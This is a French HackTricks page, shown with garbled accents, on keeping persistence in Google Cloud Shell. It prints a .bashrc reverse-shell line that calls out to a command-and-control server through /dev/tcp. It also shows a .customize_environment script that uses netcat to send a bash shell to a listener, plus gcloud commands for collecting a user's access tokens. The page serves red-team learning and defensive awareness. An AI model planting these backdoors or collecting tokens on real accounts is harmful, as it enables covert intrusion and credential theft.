# GCP - Persistance de Cloud Shell

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge HackTricks AWS)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR √†** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)
*
*
*
* d√©p√¥ts github.

</details>

## Cloud Shell

Pour plus d'informations, consultez:

{% content-ref url="../gcp-services/gcp-cloud-shell-enum.md" %}
[gcp-cloud-shell-enum.md](../gcp-services/gcp-cloud-shell-enum.md)
{% endcontent-ref %}

### Backdoor Persistant

[**Google Cloud Shell**](https://cloud.google.com/shell/) vous offre un acc√®s en ligne de commande √† vos ressources cloud directement depuis votre navigateur sans aucun co√ªt associ√©.

Vous pouvez acc√©der √† Cloud Shell de Google depuis la **console web** ou en ex√©cutant **`gcloud cloud-shell ssh`**.

Cette console offre certaines capacit√©s int√©ressantes pour les attaquants:

1. **Tout utilisateur Google ayant acc√®s √† Google Cloud** a acc√®s √† une instance Cloud Shell enti√®rement authentifi√©e (les comptes de service peuvent, m√™me en √©tant propri√©taires de l'organisation).
2. Cette instance **conservera son r√©pertoire personnel pendant au moins 120 jours** en l'absence d'activit√©.
3. Il n'y a **aucune capacit√© pour une organisation de surveiller** l'activit√© de cette instance.

Cela signifie essentiellement qu'un attaquant peut placer une porte d√©rob√©e dans le r√©pertoire personnel de l'utilisateur et tant que l'utilisateur se connecte au GC Shell tous les 120 jours au moins, la porte d√©rob√©e survivra et l'attaquant obtiendra un shell √† chaque fois qu'elle sera ex√©cut√©e simplement en faisant:

{% code overflow="wrap" %}
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
{% endcode %}

Il y a un autre fichier dans le dossier personnel appel√© **`.customize_environment`** qui, s'il existe, sera **ex√©cut√© √† chaque fois** que l'utilisateur acc√®de au **cloud shell** (comme dans la technique pr√©c√©dente). Il suffit d'ins√©rer la porte d√©rob√©e pr√©c√©dente ou une similaire pour maintenir la persistance aussi longtemps que l'utilisateur utilise "fr√©quemment" le cloud shell:
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
Il est important de noter que la **premi√®re fois qu'une action n√©cessitant une authentification est effectu√©e**, une fen√™tre d'autorisation contextuelle appara√Æt dans le navigateur de l'utilisateur. Cette fen√™tre doit √™tre accept√©e avant que la commande puisse s'ex√©cuter. Si une fen√™tre contextuelle inattendue appara√Æt, cela pourrait √©veiller des soup√ßons et compromettre potentiellement la m√©thode de persistance utilis√©e.
{% endhint %}

Ceci est la fen√™tre contextuelle lors de l'ex√©cution de `gcloud projects list` depuis le cloud shell (en tant qu'attaquant) vue dans la session utilisateur du navigateur :

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Cependant, si l'utilisateur a activement utilis√© le cloudshell, la fen√™tre contextuelle ne s'affichera pas et vous pouvez **collecter les jetons de l'utilisateur avec** :
```bash
gcloud auth print-access-token
gcloud auth application-default print-access-token
```
#### Comment la connexion SSH est √©tablie

Essentiellement, ces 3 appels API sont utilis√©s :

* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey) \[POST] (vous permet d'ajouter votre cl√© publique cr√©√©e localement)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start) \[POST] (vous permet de d√©marrer l'instance)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default](https://content-cloudshell.googleapis.com/v1/users/me/environments/default) \[GET] (vous indique l'adresse IP du cloud shell Google)

Mais vous pouvez trouver plus d'informations sur [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)

## R√©f√©rences

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
{% endhint %}
